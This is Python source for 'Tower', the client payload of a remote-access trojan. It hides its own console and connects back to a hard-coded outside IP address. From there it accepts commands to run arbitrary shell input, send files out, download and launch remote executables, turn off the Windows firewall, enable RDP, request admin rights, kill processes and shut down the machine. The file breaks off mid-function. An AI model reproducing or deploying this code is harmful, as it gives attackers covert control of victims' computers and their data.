# # # # # # # # # # # # # # # # # # # # # # # # # # # 
#	Name: R.A.F--[ Tower ]							#
#	Author: ThefixXxer [Managwu Ikenna Alfred]		#
#	Description: Tower is the client [ payload ]for #
#				 my R.A.F project.              	#
#													#
#	/Automatic compliation to EXE comming soon/ 	#
#													#
# # # # # # # # # # # # # # # # # # # # # # # # # # #


import os
import sys
import time
import psutil
import shutil
import socket 
import zipfile
import platform
import webbrowser
from struct import pack
from ctypes import windll
try:
	import urllib2
	py2= True
	py3= False
except:
	import urllib.request
	py2= False
	py3= True
from termcolor import colored
from datetime import timedelta
from subprocess import PIPE, Popen, check_output, run, call
from ctypes import Structure, windll, c_uint, sizeof, byref






# Set Reverse Host and Port.
H0ST= '167.99.52.55'
P0RT= 1504







#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
#-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

















#----------Color Codex------------|
ERROR= colored('[-] ','red')     #|
SUCCESS= colored('[+] ','green') #|
NOTICE= colored('[!] ','yellow') #|
WAITING= colored('[?] ','blue')  #|
MAYBE= colored('[=] ','cyan')    #|
pre= colored('  -- ','green')    #|


HOSTNAME= socket.gethostname()
IP= socket.gethostbyname(socket.gethostname())






# Ports for scanner.
PORTS = [
			21, 22, 23, 25, 43, 45, 53, 80, 110, 111, 135, 139, 143, 179, 443,
			445, 514, 993, 995, 1723, 3306, 3389, 5900, 8000, 8080, 8443, 8888,
			1504, 8080, 4444, 7777, 
		]






# Admin determinant.
admin_access= windll.shell32.IsUserAnAdmin()





# Help text.
CLIENT_COMMANDS=colored('''--------------------[ CLIENT_INTERACTION_COMMANDS ]--------------------
				  

|| pwd         : [ This will show you the client's current directory. ]
||
|| copy        : [ To copy a file, only accepts files or directories, Usage--> 'copy <file/directory_name>  <destination_dirctory>' ]
||
|| move        : [ To move a file or directory,  Usage--> 'move <file/directory_name>  <destination_dirctory>' ]
||
|| ls          : [ To view contents of Tower's current directory. ]
||
|| del         :  [ To delete a file or directory, Usage--> 'del <file/directory_name> ' ]
||
|| sysinfo     : [ This will display client machine information. ]
||
|| upload      : [ To upload files, Usage--> 'upload', then follow instruction. ]
||
|| download    : [ To download files, Usage--> 'download', then follow instruction. ]
||
|| quit        : [ Stops current connection with a client. To be used when interaction with a client is ongoing. ]
||
|| mkdir       : [ To create a directory[folder], Usage--> 'mkdir <name_of_folder> ' ]


//<-------------------- [ New ] --------------------->//


|| ps          : [ To list all runniing processes on client machine.]
||
|| clear       : [ Clear Tower shell. ]
||
|| kill        : [ To kill as process on client, Usage--> 'kill <PID>'. Get PID of process by using 'ps' ]
||
|| idle        : [ To get idle time of client. ]
||
|| reboot      : [ To reboot client machine. ]
||
|| shutdown    : [ To shutdown client machine. ]
||
|| hide        : [ To hide all windows on client machine. ]
||
|| uninstall   : [ This will uninstall a program from the client machine, Usage--> 'uninstall <program_name> ]
||
|| battery     : [ To view client battery info.]
||
|| users       : [ This will retrieve info on all users on client machine.]
||
|| pull        : [ To download file from url, Usage--> 'pull <file_url>' ]
||
|| pullnlaunch : [ To download and launch file fro url, Usage--> 'pullnlaunch <file_url> ]
||
|| rename      : [ To rename a file or directory on client machine, Usage--> 'rename <file_name>  <new_name>' ]
||
|| services    : [ This will display all running windows services on client. [Windows] ]
||
|| tabs        : [ To retrieve all currently running tabs on client.]
||
|| scan        : [ This will scan for open ports on client machine,
||    
||    Usage-- > 'scan'[for client's port] OR 'scan <IP_address>'[for specific Ip] ]
||
|| rdp         : [ This will enable/disable remote desktop protocol on client machine[only when Tower is admin use 'escalate' first], 
||		
||    Usage-- > 'rdp  <activate>' OR 'rdp  <deactivate>' OR 'rdp  <status>' ]
||
|| firewall    : [ This will enable/disable network firewall on client machine[only when Tower is admin use 'escalate' first], 
||			 
||    Usage-- > 'firewall  <activate>' OR 'firewall  <deactive>' OR 'firwall  <status>' ]
||
|| escalate    : [ This will attempt to grant Tower admin privilege on client [required for 'rdp' and 'firewall' commands to work] ]
||
|| launch      : [ To execute a file on client machine, Usage--> 'launch <file_name>' ]
||
|| programs    : [ To view all installed programs. NOTE!! THIS COMMAND TAKES A WHILE TO RUN. ]
||
|| visit 	   : [ This will open a url on the client default broswer, Usage--> 'visit <www.website.com>' ]

[ NOTE!!: Do not add the '<' '>' when passing input just your input and be sure to space command and input, i.e; 'launch file.exe'. ]

	  ''','green')



#---------------------------------------------------------------[ SOURCE CODE ]----------------------------------------------------------------------------------



def create_connection():
	global sett
	global TOWER
	try:
		Host= H0ST
		Port= P0RT
		TOWER= socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		TOWER.connect((Host,Port))
		#TOWER.send(str.encode(IP+'@'+HOSTNAME+'~ > ')) # This is to give the .recv() listening on the server, the IP and HOSTNAME of the client.
	except Exception as err:
		print (err)
		#create_connection() # Retry connecting if something goes wrong.














def active():
	try:
	    global IsWindowVisible
	    EnumWindows = ctypes.windll.user32.EnumWindows
	    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int), ctypes.POINTER(ctypes.c_int))
	    GetWindowText = ctypes.windll.user32.GetWindowTextW
	    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
	    IsWindowVisible = ctypes.windll.user32.IsWindowVisible
	    titles = []
	    def foreach_window(hwnd, lParam):
	        if IsWindowVisible(hwnd):
	            length = GetWindowTextLength(hwnd)
	            buff = ctypes.create_unicode_buffer(length + 1)
	            GetWindowText(hwnd, buff, length + 1)
	            titles.append(buff.value)
	        return True
	    EnumWindows(EnumWindowsProc(foreach_window), 0)    
	    #encoded = ['\n   - ' + i.encode('ascii','ignore').strip() for i in titles]
	    encoded = ['\n {} '.format(pre)+ i.strip() for i in titles]
	    encoded = filter(lambda a: a != '\n   {} '.format(pre), encoded)
	    encoded = list(set(encoded))
	    data = colored(' \n  <[-Client--Opened--Tabs-]> \n=================================\n\n','green')
	    data += ''.join(encoded)
	    TOWER.sendall(str.encode(data + '\n'))
	except Exception as get_tabs_err:
		TOWER.send(str.encode(ERROR+'Error retrieving active tabs on client:\nReason: {}'.format(str(get_tabs_err))))











def pull(url):

	try:
		filename = url.split('/')[-1]
		if py2:
			content = urllib2.urlopen(url)
		elif py3:
			content = urllib.request.urlopen(url)
		time.sleep(0.5)
		with open(filename, 'wb') as output:
			output.write(content.read())
		output.close()

		TOWER.send(str.encode(SUCCESS+"Downloaded: {0} to Client: {1}.\n".format(filename,os.path.join(os.getcwd(),filename))))

	except Exception as pull_err:
		TOWER.send(str.encode(ERROR+"Pull Error: {}.\n".format(pull_err)))














def pullnlaunch(url):
	try:
		try:
			filename = url.split('/')[-1]
		except:
			print ('Its here.')

		if py2:
			content = urllib2.urlopen(url)
		elif py3:
			content = urllib.request.urlopen(url)
		time.sleep(0.5)
		with open(filename, 'wb') as output:
			output.write(content.read())
		output.close()
		#print (SUCCESS+'File: %s downloaded successfully.'%filename)
		time.sleep(0.8)

		run(output)
		time.sleep(1)
		TOWER.send(str.encode(SUCCESS+"File: {0} download and launched on Client.\nLaunched From: {1}.\n".format(filename,os.getcwd())))

	except Exception as pullnlnch_err:
		TOWER.send(str.encode(ERROR+"Pull Error: {}.\n".format(str(pullnlnch_err))))














def battery_status():
	try:
		battery_stat= psutil.sensors_battery()

		percent= str(battery_stat[0])
		if battery_stat[0] <= 20:
		    percent= colored(battery_stat[0], 'red')
		elif percent in range(21,49):
		    percent= colored(battery_stat[0], 'yellow')
		else:
		    percent= colored(battery_stat[0], 'green') 

		batterY = ''
		batterY += SUCCESS+'Client battery status:\n\n'
		batterY += 'Percentage: {}\n'.format(percent)
		batterY += 'Time left: {:0>8}.\n'.format(str(timedelta(seconds=battery_stat[1])))
		batterY += 'Charging: {}\n'.format(battery_stat[2])
		TOWER.sendall(str.encode(batterY))

	except Exception as battery_err:
		TOWER.send(str.encode(ERROR+'unable to retrieve client battery info.\nReason: {}'.format(battery_err)))













class LASTINPUTINFO(Structure):
    _fields_ = [
        ('cbSize', c_uint),
        ('dwTime', c_uint),
    ]

def idle():
    lastInputInfo = LASTINPUTINFO()
    lastInputInfo.cbSize = sizeof(lastInputInfo)
    windll.user32.GetLastInputInfo(byref(lastInputInfo))
    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
    TOWER.sendall(str.encode(SUCCESS+'User has been inactive for : '+ millis +' seconds'))














def list_users():
	try:
		usrs= psutil.users()
		user_list= ''

		for usr in usrs:
		    user_list += SUCCESS+'Users on client machine:\n\n'
		    user_list += 'User Name: {}\n'.format(usr[0])
		    user_list += 'Terminal: {}\n'.format(usr[1])
		    user_list += 'Host: {}\n'.format(usr[2])
		    user_list += 'Created: {:0>8}\n'.format(str(timedelta(seconds= usr[3])))

		TOWER.sendall(str.encode(user_list))
		#print (SUCCESS+'All users on your PC:\n\n{}'.format(user_list))
	except Exception as lst_usr_err:
		TOWER.send(str.encode(ERROR+'Error retrieving user list from client.\nReason: {}'.format(lst_usr_err)))













def running_SERVICES():
    try:
        services=''
        win_services= psutil.win_service_iter()
        for win_service in win_services:
            services += colored(win_service, 'cyan')+'\n'
        TOWER.sendall(str.encode(SUCCESS+'Client running services:\n\n{}'.format(services)))
        #print (SUCCESS+'Your running services:\n\n{}'.format(services))
    except Exception as get_serv_err:
        TOWER.sendall(str.encode(ERROR+'Unable to retrieve client running services.\nReason: {}'.format(get_serv_err)))














def sysinfo():
	sysinfo = """
       <[-CLIENT--MACHINE--DETAILS-]>
    ===================================
    Name: %s
    FQDN: %s
    System Platform: %s
    Machine: %s
    Node: %s
    Platform: %s
    Processor: %s
    System OS: %s
    Release: %s
    Version: %s
            """ %(socket.gethostname(), socket.getfqdn(), sys.platform,platform.machine(),platform.node(),platform.platform(),platform.processor(),platform.system(),platform.release(),platform.version())
	sysinfo= colored(sysinfo,'green')
	TOWER.send(str.encode(sysinfo))














def scan_local_network(ip):
	try:
		try:
			socket.inet_aton(ip)
		except socket.error:
			#TOWER.send(str.encode(ERROR+'Invalid IP address.'))
			pass

		results = ''

		for port in PORTS:

			sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock_udp= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			connection_tcp = sock_tcp.connect_ex((ip, port))
			connection_udp = sock_udp.connect_ex((ip, port))
			socket.setdefaulttimeout(0.5)
			state_tcp = colored('open  ','green') if not connection_tcp else colored('closed','red')
			state_udp = colored('  open','green') if not connection_udp else colored('closed','red') # The spaces in the 'open' string are important for apperance. DON'T ULTER!!
			line= colored('|<-----[TCP]---------PORTS----------[UDP]----->|','green')
			results += '{:>5}/tcp {:>7}'.format(port, state_tcp, port, state_udp)+colored(' |  ------  |','yellow')+'{:>5}/udp {:>7}\n'.format(port, state_tcp, port, state_udp)
		results= line+'\n\n'+results.rstrip()
		TOWER.sendall(str.encode(SUCCESS+'Client ports:\n\n %s')%results.encode())

	except Exception as port_scan_err:
		TOWER.send(str.encode(ERROR+'Error scanning client ports: {}'.format(port_scan_err)))













def program_list():
	try:

		result_content = os.popen('wmic product get name')
		output = result_content.read().strip()

		TOWER.sendall(str.encode(SUCCESS+"Clients installed Programs\n\n{0}{1}.\n".format(pre,output)))

	except Exception as prog_list_err:
		TOWER.sendall(str.encode(ERROR+"Can't list installed programs.\nReason: {1} \n".format(prog_list_err)))













def program_uninstall(drop):
	try:
		program = drop.split('uninstall ')[1]
		#OR
		#program = command.split(' ')[-1]

		result_content = os.popen('wmic product where name="{}" call uninstall /nointeractive'.format(program))
		output = result_content.read().strip()

		if "No Instance(s) Available." in output:
			TOWER.send(str.encode(ERROR+"Program {} not found.\n".format(program)))
		else:
			TOWER.send(str.encode(SUCCESS+"Program {0} uninstalled successfully.\n".format(program)))
			#print (SUCCESS+'Program: {} Uninstalled form your PC.'.format(program))

	except Exception as uninstall_err:
		TOWER.send(str.encode(ERROR+"Can't uninstall {0}.\nReason: {1} \n".format(program, str(uninstall_err))))













def run_as_admin():
    import os
    import sys
    import win32com.shell.shell as shell
    ASADMIN = 'asadmin'

    if sys.argv[-1] != ASADMIN:
        script = os.path.abspath(sys.argv[0])
        #params = ' '.join([script] + sys.argv[1:] + [ASADMIN])
        print (sys.argv[0])
        shell.ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(script))
        #sys.exit(0)
        return True













def aux_file_trans_fuctn(byte_s):
	while (True):
		byte_s.read(1024)
		TOWER.send(byte_s)
		if not byte_s:
			#print ('file bytes commletely sent')
			break
		byte_s.close()













def download():
	try:
		#socket.send(str.encode('download'))
		while True:
			file_S= TOWER.recv(1024)
			file= TOWER.recv(1024)
			if file.decode('utf-8').strip() != 'done': # correction made here
				try:
					file_size= int(file_S.decode('utf-8'))
					time.sleep(0.8)
					#print (NOTICE+'File size: '+str(file_size))
				except:
					#print ('\n')
					#print (ERROR+'Error: File size could not be established.')
					#print ('\n')
					pass
				drop_size= 0
				new= open('%s'%bytes.decode(file), 'wb')
				print ('\n')
				print (WAITING+"Downloading file: %s"%file.decode())
				while (True):   
					try:    
						file_bytes = TOWER.recv(1024)
						drop_size= drop_size+len(file_bytes)
					except:
						print ('its here 1')
					new.write(file_bytes)
					if drop_size >= file_size:
						new.close()
						break  # break position switched.
						#print (SUCCESS+'File upload chain broken.')
				new.close()
				time.sleep(1)
				#print (SUCCESS+'Downloaded '+str(file)+' successfully.')
				#print ('\n')
			elif file.decode('utf-8').strip()== 'done':
				#print (SUCCESS+'File upload chain broken.')
				break
	except Exception as dnwld_fl_err:
		TOWER.send(str.encode(ERROR+'File download_error: {}'.format(dnwld_fl_err)))













def firewall_switch(drop):
	try:
		mode = drop.split('firewall ')[1]
		#OR
		#mode = drop.split(' ')[-1]

		if admin_access == 'Yes':

			if mode == 'activate':

				cmd_command = 'NetSh Advfirewall set allprofiles state on'
				Popen(cmd_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
				time.sleep(0.8)
				TOWER.send(str.encode(SUCCESS+"Firewall Turned: {} Inbound connections to client will be blocked.".format(colored('.ON.', 'red'))))
				#print (NOTICE+'Your network-firewall has been 'colored('activated!','green'))


			elif mode == 'deactivate':

				cmd_command = 'NetSh Advfirewall set allprofiles state off'
				Popen(cmd_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)
				time.sleep(0.8)
				TOWER.send(str.encode(SUCCESS+"Firewall Turned: {}".format(colored('.OFF.', 'green'))))
				#print (NOTICE+'Your network-firewall has been '+colored('deactivated!','red'))


			elif mode == 'status':

				Firewall = subprocess.check_output(['Netsh', 'Advfirewall', 'show', 'allprofiles'], shell=False)

				for noline, line in enumerate(Firewall.split("\n")):

					if noline == 3:
						domain = line.split("State")[1].strip()

					elif noline == 20:
						private = line.split("State")[1].strip()

					elif noline == 37:
						public = line.split("State")[1].strip()

				result = "Domain profile: {0}\n Private profile: {1}\n Public profile: {2}\n".format(domain, private, public)
				TOWER.send(str.encode(SUCCESS+result))

		else:
			TOWER.send(str.encode(ERROR+"Permission denied!! it seems Tower is not running as admin, use 'escalate' command."))
	except Exception as fir_wll_err:
		TOWER.send(str.encode(ERROR+'Client firewall handling error: {}'.format(str(fir_wll_err))))













def upload():
	try:
		while True:
			global byte_s
			#print ('inside upload')
			file= TOWER.recv(1024)
			#print ('waiting')
			if file.decode('utf-8').strip() != 'done':
				if os.path.isfile(file):
					file_size= str(os.path.getsize(file.decode('utf-8').strip())) # made change here
					#socket.send(str(file_size).encode('utf-8'))
					TOWER.send(str.encode(file_size))
					try:
						#print (SUCCESS+'Reading file')
						byteS= open(file, 'rb')
						byte_s= byteS.read()
						try:
							#print (WAITING+'Sending file: '+str(file))
							#aux_file_trans_fuctn(byte_s)
							TOWER.sendall(byte_s)
							#print (SUCCESS+'%s sent successfully' %str(file))
						except Exception as snd_fl_err:
							#print (ERROR+'Error sending file...')
							#print (ERROR+'aux_send function failed: '+str(snd_fl_err))
							pass 
						#TOWER.sendfile(byte, 0)
						#try:
							#print (SUCCESS+'%s sent successfully' %str(file))
						#except:
							#pass
						byteS.close()

					except Exception as e:
						#print (e)
						pass
				elif not os.path.isfile(file):
					TOWER.send(str.encode(ERROR+'No file named: '+file))
					break
			elif file.decode('utf-8').strip()== 'done':
				#print (SUCCESS+'File download chain broken.')
				break
	except Exception as snd_fl_err:
		TOWER.send(str.encode(ERROR+'File upload_Error: '+ str(snd_fl_err)))













def browse(site):
    site = site.split(' ',1)[1]
    open_bool = webbrowser.open(site)
    if open_bool:
    	time.sleep(0.8)
    	TOWER.sendall(str.encode(SUCCESS+'Opened site : %s on client browser.'% site))
    else:
    	TOWER.sendall(str.encode(ERROR+'Could not open site : %s on client browser.'% site))













def reboot():
	try:
		os.system("shutdown /r /t 0")
		TOWER.send(str.encode(SUCCESS+"Rebooting Client machine...\n"))
		#print (SUCCESS+'Your PC is rebooting down!!')
		TOWER.close()

	except Exception as rbut_err:
		TOWER.send(str.encode(ERROR+"Can't reboot client machine.\nReason: %s \n")% str(rbut_err))













def shutdown():
	try:
		os.system("shutdown  /s /t 0")
		TOWER.send(str.encode(SUCCESS+"Shutting down Client machine...\n"))
		#print (SUCCESS+'Your PC is shutting down!!')
		TOWER.close()

	except Exception as sht_dwn_err:
		TOWER.send(str.encode(ERROR+"Can't shutdown client machine.\nReason: %s \n")% str(sht_dwn_err))













def remote_desktop(drop):
	try:

		if admin_access == 'Yes':

			action = drop.split("rdp ")[1]
			#OR
			#action = drop.split(" ")[-1]

			if action == "activate":

				registry_command = b'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
									' /v fDenyTSConnections /t REG_DWORD /d 0 /f'
				Remote_Desktop = Popen(registry_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)

				time.sleep(0.8)

				do_final = b'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
							' /v fAllowToGetHelp /t REG_DWORD /d 1 /f'
				Remote_Assistance = Popen(do_final, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)

				TOWER.send(str.encode(SUCCESS+"Remote Desktop Protocol is {}'\n'".format(colored('Active!','green'))))


			elif action == "deactivate":

				registry_command = b'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
									' /v fDenyTSConnections /t REG_DWORD /d 1 /f'
				Remote_Desktop = Popen(registry_command, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)

				do_final = b'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server"' + \
							' /v fAllowToGetHelp /t REG_DWORD /d 0 /f'
				Remote_Assistance = Popen(do_final, shell=False, stdout=PIPE, stderr=PIPE, stdin=PIPE)

				TOWER.send(str.encode(SUCCESS+"Remote Desktop Protocol is {} \n".format(colored("Inactive","red"))))

		else:
			TOWER.send(str.encode(ERROR+"Permission denied!! it seems Tower is not running as admin, use 'escalate' command."))

	except Exception as rdp_err:
		TOWER.send(str.encode(ERROR+"Client RDP error!: %s \n")%str(rdp_err))












def hide_Tower_console(h=1):

	if h == 1:

		try:

			import win32console, win32gui
			window = win32console.GetConsoleWindow()
			win32gui.ShowWindow(window, 0)

			return True

		except:
			return False

	else:
		TOWER.send(str.encode(WARNING+'WARNING: Tower windows are showing on client machine!!'))
		#print(WARNING+'WARNING: windows are showen.')













def validate():
	HOSTNAME= socket.gethostname()
	IP= socket.gethostbyname(socket.gethostname())

	OS= platform.system()
	info= (IP+'@'+HOSTNAME+' '+OS)

	cl_os= info.split(' ')[-1]
	cl_add= info.split(' ')[0]

	cl_os_BL= '\x1b[1m\x1b[5m{}\x1b[0m'.format(cl_os)
	#cl_os_Co= '\x1b[1m\x1b[36{}\x1b[0m'.format(cl_os_BL)
	cl_os_Co= colored(cl_os_BL, 'blue')

	border= colored('--[[ ', 'cyan')
	border2= colored(' ]]~ >', 'cyan')

	ip= colored(cl_add, 'cyan')
	#done= print (colored('{0}[[ {1} ]]~ >', .format(cl_add, cl_os))
	Tower_incoming= '{0}{1}{2}{3}'.format(ip,border,cl_os_Co,border2)
	time.sleep(0.6)
	TOWER.sendall(str.encode(Tower_incoming))












def communicate():
	hide_Tower_console(1)
	create_connection()
	validate()
	actions= 'upload', 'download', 'sysinfo', 'shutdown', 'reboot', 'escalate', 'visit', 'hidetabs', 'idle', 'scan' 
	while 1: # Because we want a recursive connection.
		try: 
			global drop
			drop= TOWER.recv(1024) # Receive full buffer size.
			if len(drop)> 0:
				if drop[:3].decode('utf-8')== 'pwd':
					TOWER.send(str.encode(' '+NOTICE+'Client current directory:'+'\n\n'+os.getcwd()+'\n'))

				





				elif drop[:].decode('utf-8').strip()== 'idle':
					idle()

				





				elif drop[:5].decode('utf-8')== 'mkdir': # If 'mkdir' is passed, create directory with specified name.
					os.makedirs(drop[6:].decode('utf-8'))
					TOWER.send(str.encode(' '+SUCCESS+'Directory: '+drop[6:].decode('utf-8')+' created in client.'))

				





				elif drop[:].decode('utf-8')== 'download': 
					upload()

				





				elif drop[:5].decode('utf-8')== 'visit':
					site= drop[:].decode('utf-8')
					browse(site)
				






				elif drop[:].decode('utf-8').strip()== 'shutdown':
					shutdown()

				





				elif drop[:].decode('utf-8')== 'upload':
					download()

				





				elif drop[:].decode('utf-8')== 'help':
					try:
						TOWER.sendall(str.encode('\n'+CLIENT_COMMANDS))
					except Exception as hlp_err:
						TOWER.send (ERROR+'Unable to display help.\nReason: {}'.format(hlp_err))

				





				elif drop[:].decode('utf-8').startswith('rename'):
					drop= drop[:].decode('utf-8')
					old_name= drop.split(' ')[1]
					new_name= drop.split()[2]
					if os.path.isfile(old_name):
						os.rename(old_name, new_name)
						TOWER.send(str.encode(SUCCESS+'Remote file: {0} renamed to --> {1}'.format(old_name, new_name)))		
					elif os.path.isdir(old_name):
						os.rename(old_name, new_name)
						TOWER.send(str.encode(SUCCESS+'Remote directory: {0} renamed to --> {1}'.format(old_name, new_name)))
					else:
						TOWER.send(str.encode(ERROR+'No file or directory named: {}'.format(File)))	
			
				





				elif drop[:].decode('utf-8').strip()== 'reboot':
					reboot()				

				





				elif drop[:4].decode('utf-8')== 'scan':
					addresS= drop.decode('utf-8').split('scan ')[-1]
					if not addresS== 'scan':
						scan_local_network(addresS)
					elif addresS== 'scan':
						scan_local_network(IP)

				





				elif drop[:].decode('utf-8').strip()== 'escalate':
					admin= run_as_admin()
					if admin is True:
						TOWER.send(str.encode(SUCCESS+'Tower is now running as admin!!'))	
						#print (SUCCESS+'Tower is now running as admin.')

				





				elif drop[:3].decode('utf-8')== 'del':
					if os.path.isfile(drop[4:].decode('utf-8')):
						os.remove(drop[4:].decode('utf-8'))
						TOWER.send(str.encode(SUCCESS+'File: {} deleted.'.format(drop[4:].decode('utf-8'))))
						#print (SUCCESS+'File: '+drop[4:].decode('utf-8')+' deleted.')
					elif os.path.isdir(drop[4:].decode('utf-8')):
						shutil.rmtree(drop[4:].decode('utf-8'))
						TOWER.send(str.encode(SUCCESS+'Directory: {} deleted.'.format(drop[4:].decode('utf-8')))) 
						#print (SUCCESS+'Directory: '+drop[4:].decode('utf-8')+' deleted.')
					else:
						TOWER.send(str.encode(ERROR+'No file or directory named: {}'.format(File)))

				





				elif drop[:3].decode('utf-8')== 'rdp':
					drop= drop[:].decode('utf-8')
					remote_desktop(drop)
				
				





				elif drop[:].decode('utf-8').strip()== 'ps':
					try:
						process_cmd = 'tasklist'
						
						processes= ''
						proc = os.popen(process_cmd)
						for line in proc:
							processes+= str(line)
						time.sleep(0.5)
						#TOWER.send(str.encode(str(len(processes))))
						processes = colored(processes, 'blue')
						TOWER.sendall(str.encode(' '+SUCCESS+'Client running processes:\n\n{}'.format(processes)))
						#print (SUCCESS+'Your running processes processes:\n\n%s'% processes)
					except Exception as ps_err:
						TOWER.send(str.encode(ERROR+"Error retrieving client process list!.\nReason: {}".format(ps_err)))

				





				elif drop[:].decode('utf-8').strip()== 'services':
					running_SERVICES()

				





				elif drop[:4].decode('utf-8')== 'kill':
					drop= drop[:].decode('utf-8')
					try:
						pid = drop.split()[1]

						kill_cmd = 'taskkill /PID ' + pid + ' /F'
						proc = call(kill_cmd, shell=False, stdout=PIPE)
						if proc:
							TOWER.send(str.encode(SUCCESS+'Client process: {} killed successfully.\n'.format(pid)))
							#print (SUCCESS+'Client process: '+ pid + ' killed successfully.\n')
						else:
							TOWER.send(str.encode(ERROR+'Client process: {} can\'t be killed.\n'.format(pid)))
					except Exception as ps_kill_err:
						TOWER.send(str.encode(ERROR+'Unable to kill process: {0}\nReason: {1}'.format(pid, ps_kill_err)))

				





				elif drop[:].decode('utf-8').strip()== 'users':
					list_users()

				





				elif drop[:2].decode('utf-8')=='cd':
					os.chdir(drop[3:].decode('utf-8'))
					TOWER.send(str.encode(' '+NOTICE+'Client current directory:'+'\n'+os.getcwd()+'\n' ))
				
				





				elif drop[:].decode('utf-8')== 'cd ..':
					os.chdir(os.path.dirname(os.getcwd())) # Using os.path.dirname to migrate to the previous path with drop == 'cd ..'
					TOWER.send(str.encode(' '+NOTICE+'Client current directory:'+'\n'+os.getcwd()+'\n' ))

				





				elif drop[:].decode('utf-8').strip()== 'battery':
					battery_status()				
								
				





				elif drop[:4].decode('utf-8')== 'pull':
					url= drop.decode('utf-8').split('pull ')[1]
					pull(url) #OR
					#url= drop.decode('utf-8').split(' ')[-1]
					#pull(url)
					
				





				elif drop[:].decode('utf-8').startswith('pullnlaunch'):
					try:
						url= drop.decode('utf-8').split('pullnlaunch ')[-1]
					except:
						#print ('Its here.')
						pass
					pullnlaunch(url) #OR
					#url= drop.decode('utf-8').split(' ')[-1]
					#pullnlaunch(url)

				





				elif drop[:].decode('utf-8').strip()== 'programs':
					program_list()

				





				elif drop[:].decode('utf-8').strip()== 'hide':
					hide= hide_Tower_console(1)
					if hide is True:
						TOWER.send(str.encode(SUCCESS+'Tower window has been hidden on client.'))

				





				elif drop[:].decode('utf-8')== 'ls':
					dir_files=''
					try:
						for x in os.listdir(os.getcwd()):
							dir_files+= str(pre+ x+'\n')
						TOWER.sendall(str.encode('\n'+' '+NOTICE+'Client current directory Contents:'+'\n\n'+str(dir_files+'\n' )))
					except Exception as ls_err:
						TOWER.send(str.encode(ls_err))
						
				





				elif drop[:].decode('utf-8').startswith('firewall'):
					drop= drop[:].decode('utf-8')
					firewall_switch(drop)

				




				elif drop[:].decode('utf-8').startswith('launch'):
					drop= drop[:].decode('utf-8')
					File= drop.split('launch ')[1]
					if os.path.isfile(File):
						os.system(File)
						time.sleep(0.5)
						TOWER.send(str.encode(SUCCESS+'File: {} launched successfully on client machine\n'.format(File)))
						#print (SUCCESS+'File: %s launched successfully on client machine\n')% File)
					elif os.path.isdir(File):
						os.system('start {}'.format(File))
						time.sleep(0.5)
						TOWER.send(str.encode(SUCCESS+'Directory: {} launched successfully on client machine\n'.format(File)))
						#print (SUCCESS+'Directory: %s launched successfully on client machine\n')% File)

					else:
						TOWER.send(str.encode(ERROR+'No file or directory named: {}'.format(File)))

				





				elif drop[:4].decode('utf-8')== 'move': # Handles move file command.
					drop= drop[:].decode('utf-8')
					old_location= drop.split(' ')[1]
					new_location= drop.split()[2]
					if os.path.isfile(old_location):
						shutil.move(old_location, new_location)
						TOWER.send(str.encode(SUCCESS+'Remote file: {0} moved to --> {1}'.format(old_location, new_location)))
						#print (SUCCESS+'File: %s moved to --> %s')% old_location, new_location)
					elif os.path.isdir(old_location):
						shutil.move(old_location, new_location)
						TOWER.send(str.encode(SUCCESS+'Remote directory: {0} moved to --> {1}'.format(old_location, new_location)))
						#print (SUCCESS+'Directory: %s moved to --> %s')% old_location, new_location)
					else:
						TOWER.send(str.encode(ERROR+'No file or directory named: {}'.format(old_location)))

				





				elif drop[:4].decode('utf-8')== 'copy': # For copying 
					drop= drop[:].decode('utf-8')
					old_location= drop.split(' ')[1]
					new_location= drop.split()[2]
					if os.path.isfile(old_location):
						shutil.copy(old_location, new_location)
						TOWER.send(str.encode(SUCCESS+'Remote file: {0} copied to --> {1}'.format(old_location, new_location)))
						#print (SUCCESS+'File: %s copied to --> %s')% old_location, new_location)
					elif os.path.isdir(old_location):
						shutil.copytree(old_location, new_location)
						TOWER.send(str.encode(SUCCESS+'Remote directory: {0} copied to --> {1}'.format(old_location, new_location)))
						#print (SUCCESS+'Directory: %s copied to --> %s')% old_location, new_location)
					else:
						TOWER.send(str.encode(ERROR+'No file or directory named: {}'.format(old_location)))

				





				elif drop[:].decode('utf-8')== 'sysinfo':
					sysinfo()

				





				elif drop[:].decode('utf-8').startswith('uninstall'):
					drop= drop[:].decode('utf-8')					
					program_uninstall(drop)				

				





				elif drop[:].decode('utf-8')== 'quit':
					TOWER.send(str.encode('<<- | '+IP+'@'+HOSTNAME+' | ->>'))
					time.sleep(0.4)
					#TOWER.close()
					sys.exit() # Ends the session in a graceful manner unlike TOWER.close()
				

				





				elif drop[:].decode('utf-8') not in actions: 
					if not os.path.isfile(drop):
						if len(drop)> 0:
							Exec= Popen(drop[:].decode('utf-8'), shell=True, stdout=PIPE, stdin=PIPE, stderr=PIPE)
							srv_incoming_byte= Exec.stdout.read() + Exec.stderr.read()
							srv_incoming_string= bytes.decode(srv_incoming_byte, 'utf-8') # Converts output from bytes to string.
							#socket.send(str.encode(srv_incoming_string+'\n'+IP+'@'+HOSTNAME+'~ > '))
							validate()

# //////////// TARGET: comment out validate() here ..to check if this else below will run, if it breaks anything undo.


			else:
				for _ in range(3):
					if len(drop)== 0:
						blank_cmd= MAYBE+'3 nulled bytes entries--> watch it!!'
						TOWER.send(str.encode(blank_cmd))

		





		except Exception as cli_Err:
